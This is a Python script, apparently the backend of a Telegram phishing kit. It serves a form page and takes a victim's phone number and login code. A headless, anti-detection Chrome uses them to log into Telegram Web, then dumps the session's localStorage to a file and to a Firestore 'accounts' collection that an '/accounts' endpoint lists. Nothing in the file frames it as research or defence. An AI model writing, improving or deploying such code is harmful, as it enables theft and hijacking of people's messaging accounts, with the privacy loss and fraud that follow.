import undetected_chromedriver as uc
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
import json
import time
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
from google.oauth2 import service_account
from google.cloud import firestore
from dotenv import load_dotenv
import os

load_dotenv()

# Global variables to store data
phone_data = {}
login_code = None
code_received = threading.Event()
phone_received = threading.Event()

firestore_db = None
try:
    fb_key = os.environ.get('FIREBASE_KEY')
    if fb_key:
        fb_key = fb_key.strip().strip("'\"")
        sa_info = json.loads(fb_key)
        creds = service_account.Credentials.from_service_account_info(sa_info)
        firestore_db = firestore.Client(project=sa_info.get('project_id'), credentials=creds)
        print("Firestore initialized")
    else:
        print("FIREBASE_KEY not found in environment; Firestore disabled")
except Exception as e:
    print(f"Failed to initialize Firestore: {e}")
    firestore_db = None

class TelegramAutomation:
    def __init__(self):
        self.driver = None
        self.setup_driver()
        self.current_status = "Ready"
    
    def setup_driver(self):
        """Configure and initialize the WebDriver"""
        chrome_options = uc.ChromeOptions()
        chrome_options.add_argument('--headless')
        chrome_options.add_argument('--disable-gpu')
        chrome_options.add_argument('--no-sandbox')
        chrome_options.add_argument('--disable-dev-shm-usage')
        chrome_options.add_argument('user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36')

        try:
            self.driver = uc.Chrome(options=chrome_options)
            print("WebDriver initialized successfully")
        except Exception as e:
            print(f"Failed to initialize WebDriver: {e}")
            raise

    def login_with_phone(self, country_code, phone_number):
        """Perform Telegram login with phone number"""
        try:
            # Navigate to Telegram Web
            self.driver.get('https://web.telegram.org/a/')
            print("Navigated to Telegram Web")
            
            # Wait for page to load
            time.sleep(5)
            
            # Try multiple selectors for the login button
            button_selectors = [
                "//button[contains(text(), 'Log in by phone Number')]",
                "//button[contains(text(), 'Log in by phone')]",
                "//button[contains(., 'phone')]",
                "//button[contains(@class, 'auth-button')]",
                "//button[contains(@class, 'primary')]",
                "//div[contains(@class, 'button') and contains(text(), 'Log in')]"
            ]
            
            button_found = False
            for selector in button_selectors:
                try:
                    button = WebDriverWait(self.driver, 30).until(
                        EC.element_to_be_clickable((By.XPATH, selector))
                    )
                    print(f"Button found with selector: {selector}")
                    button.click()
                    button_found = True
                    print("Login button clicked successfully!")
                    break
                except Exception as e:
                    print(f"Selector failed: {selector} - {str(e)}")
                    continue
            
            if not button_found:
                raise Exception("Could not find login button")
            
            # Wait for form elements
            time.sleep(3)
            
            # Click on country dropdown to open it
            country_dropdown = WebDriverWait(self.driver, 10).until(
                EC.element_to_be_clickable((By.CSS_SELECTOR, "div.CountryCodeInput"))
            )
            country_dropdown.click()
            print("Country dropdown clicked")
            
            time.sleep(2)
            
            # Search for country in the dropdown
            search_input = WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "input#sign-in-phone-code"))
            )
            search_input.clear()
            
            # Get country name from country code
            country_name = self.get_country_name(country_code)
            search_input.send_keys(country_name)
            print(f"Searched for {country_name}")
            
            time.sleep(2)
            
            # Select country from the dropdown
            country_option = WebDriverWait(self.driver, 10).until(
                EC.element_to_be_clickable((By.XPATH, f"//div[contains(@class, 'MenuItem')]//span[contains(text(), '{country_name}')]"))
            )
            country_option.click()
            print(f"{country_name} selected from dropdown")
            
            time.sleep(2)
            
            # Enter the phone number
            phone_input = WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, 'input#sign-in-phone-number'))
            )
            

            phone_input.send_keys(phone_number)
            print("Phone number entered")
            
            # Click Next button
            time.sleep(2)
            next_button_selectors = [
                "//button[contains(text(), 'Next')]",
                "//button[contains(@class, 'auth-button') and contains(@class, 'primary')]",
                "//button[@type='submit']",
                "button.Button.auth-button.default.primary"
            ]
            
            next_button = None
            for selector in next_button_selectors:
                try:
                    if selector.startswith('//'):
                        next_button = self.driver.find_element(By.XPATH, selector)
                    else:
                        next_button = self.driver.find_element(By.CSS_SELECTOR, selector)
                    
                    if next_button.is_enabled():
                        print(f"Next button found with selector: {selector}")
                        next_button.click()
                        print("Next button clicked")
                        break
                    else:
                        next_button = None
                        print("Next button found but disabled")
                except:
                    continue
            
            if not next_button:
                # Fallback: try JavaScript click
                buttons = self.driver.find_elements(By.CSS_SELECTOR, "button.primary")
                for button in buttons:
                    if button.is_displayed():
                        self.driver.execute_script("arguments[0].click();", button)
                        print("Clicked button using JavaScript")
                        break
            
            self.current_status = "code_required"
            return True
            
        except Exception as e:
            print(f"Error during phone login: {e}")
            self.current_status = f"error: {str(e)}"
            # Save error details
            self.driver.save_screenshot('telegram_error.png')
            with open('telegram_error_source.html', 'w', encoding='utf-8') as f:
                f.write(self.driver.page_source)
            print("Error screenshot and page source saved.")
            return False

    def get_country_name(self, country_code):
        """Get country name from country code"""
        country_map = {
            "251": "Ethiopia",
            "1": "United States",
            "44": "United Kingdom",
            "91": "India",
            "86": "China",
            "49": "Germany",
            "33": "France",
            "39": "Italy",
            "34": "Spain",
            "7": "Russia",
            "81": "Japan",
            "82": "South Korea",
        }
        return country_map.get(country_code, "Ethiopia")

    def enter_login_code(self, code):
        """Enter the login code received from user"""
        try:
            # Wait for code input page
            code_input = WebDriverWait(self.driver, 30).until(
                EC.presence_of_element_located((By.ID, "sign-in-code"))
            )
            
            code_input.send_keys(code)
            print("Login code submitted")
            
            # Wait for successful login
            WebDriverWait(self.driver, 30).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, '.chat-list, .dialogs, .conversation-list'))
            )
            print("Login successful!")
            
            # Export LocalStorage
            local_storage_data = self.driver.execute_script("return Object.assign({}, localStorage);")
            with open('telegram_localstorage_headless.json', 'w') as f:
                json.dump(local_storage_data, f, indent=2)
            print("LocalStorage exported to telegram_localstorage_headless.json")

            try:
                if firestore_db:
                    doc = {
                        "phone_number": getattr(self, "phone_number", "unknown"),
                        "local_storage": local_storage_data,
                        "created_at": firestore.SERVER_TIMESTAMP
                    }
                    firestore_db.collection("accounts").add(doc)
                    print("LocalStorage saved to Firestore collection 'accounts'")
                else:
                    print("Firestore not initialized; skipped saving localStorage to Firestore")
            except Exception as e:
                print(f"Failed to save to Firestore: {e}")
            
            self.current_status = "login_success"
            return True
            
        except Exception as e:
            print(f"Error during code entry: {e}")
            self.current_status = f"error: {str(e)}"
            return False

    def close(self):
        """Close the WebDriver"""
        if self.driver:
            self.driver.quit()
            print("WebDriver closed")

# Global automation instance
automation = None

class TelegramHTTPHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        """Handle GET requests"""
        if self.path == '/status':
            status = automation.current_status if automation else "not_initialized"
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(json.dumps({"status": status}).encode())
        
        elif self.path == '/':
            # Serve form.html
            try:
                with open('form.html', 'rb') as f:
                    content = f.read()
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(content)
            except FileNotFoundError:
                self.send_error(404, "File not found")
        
        elif self.path == '/home1':
            # Serve home.html
            try:
                with open('home1.html', 'rb') as f:
                    content = f.read()
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(content)
            except FileNotFoundError:
                self.send_error(404, "File not found")
        
        elif self.path == '/accounts':
            # Fetch accounts from Firestore
            if not firestore_db:
                self.send_response(500)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({"error": "Firestore not initialized"}).encode())
                return
            
            try:
                accounts_ref = firestore_db.collection("accounts")
                docs = accounts_ref.stream()
                accounts = []
                for doc in docs:
                    data = doc.to_dict()
                    # Convert timestamp to ISO string if present
                    if 'created_at' in data and data['created_at']:
                        data['created_at'] = data['created_at'].isoformat()
                    accounts.append(data)
                
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps(accounts).encode())
            except Exception as e:
                self.send_response(500)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({"error": str(e)}).encode())
        
        else:
            self.send_error(404, "Endpoint not found")
    
    def do_POST(self):
        """Handle POST requests for phone number and code"""
        # Get content length
        content_length = int(self.headers.get('Content-Length', 0))
        
        # Read the POST data
        if content_length > 0:
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))
        else:
            data = {}
        
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        
        global automation
        
        if self.path == '/phone':
            if not automation:
                automation = TelegramAutomation()
            
            country_code = data.get('country_code', '')
            phone_number = data.get('phone_number', '')
            
            if not country_code or not phone_number:
                response = {"error": "Missing country_code or phone_number"}
            else:
                # store provided phone number on the automation instance for later Firestore saving
                automation.phone_number = f"+{country_code}{phone_number}"
                
                # Run login in a separate thread to avoid blocking
                def run_login():
                    automation.login_with_phone(country_code, phone_number)
                
                thread = threading.Thread(target=run_login)
                thread.daemon = True
                thread.start()
                
                response = {"message": "Phone number received, processing login..."}
            
        elif self.path == '/code':
            if not automation:
                response = {"error": "Automation not initialized. Please enter phone number first."}
            else:
                code = data.get('code', '')
                
                if not code:
                    response = {"error": "Missing code"}
                else:
                    # Run code entry in a separate thread
                    def run_code():
                        automation.enter_login_code(code)
                    
                    thread = threading.Thread(target=run_code)
                    thread.daemon = True
                    thread.start()
                    
                    response = {"message": "Code received, processing..."}
        
        else:
            response = {"error": "Invalid endpoint"}
        
        self.wfile.write(json.dumps(response).encode('utf-8'))
    
    def do_OPTIONS(self):
        """Handle CORS preflight requests"""
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
    
    def log_message(self, format, *args):
        """Override to reduce log noise"""
        # Uncomment the next line if you want to see all requests
        # print(f"{self.client_address[0]} - - [{self.log_date_time_string()}] {format % args}")
        pass

def run_server():
    port = int(os.environ.get('PORT', 8765))
    server = HTTPServer(('0.0.0.0', port), TelegramHTTPHandler)
    print(f"HTTP server started on 0.0.0.0:{port}")
    print("Press Ctrl+C to stop the server")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nShutting down server...")
        if automation:
            automation.close()

if __name__ == "__main__":
    run_server()